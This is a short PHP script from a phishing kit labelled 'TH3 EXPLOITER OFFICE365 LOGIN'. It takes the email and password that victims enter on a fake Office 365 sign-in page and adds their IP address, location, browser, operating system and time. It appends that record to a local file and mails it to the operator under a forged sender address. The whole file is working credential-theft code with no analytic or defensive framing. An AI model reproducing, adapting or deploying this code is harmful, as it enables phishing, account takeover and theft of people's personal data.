<?php if(isset($_POST['USR'])&&isset($_POST['PSS'])){session_start();include '../extra/mine.php';$msg="=========== <[ TH3 EXPLOITER OFFICE365 LOGIN ]> ===========\r\n";$msg.="---------------------- Login ----------------------\r\n";$msg.="EMAIL		: {$_POST['USR']}\r\n";$msg.="PASS		: {$_POST['PSS']}\r\n";$msg.="--------------------- IP Info ---------------------\r\n";$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";$msg.="TIME		: ".now()." GMT\r\n";$msg.="=========== <[ IK4 EXPLOITER OFFICE365 LOGIN ]> ===========\r\n\r\n\r\n";$save=fopen("../stored.txt","a+");fwrite($save,$msg);fclose($save);$subject="TH3 EXPLOITER V1 OFFICE365 LOGIN [".$_POST['USR']."] From [".$_SESSION['ip_countryName']."]";$headers="From: John de Fisher <info@mailer.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($yours,$subject,$msg,$headers);exit('done');}?>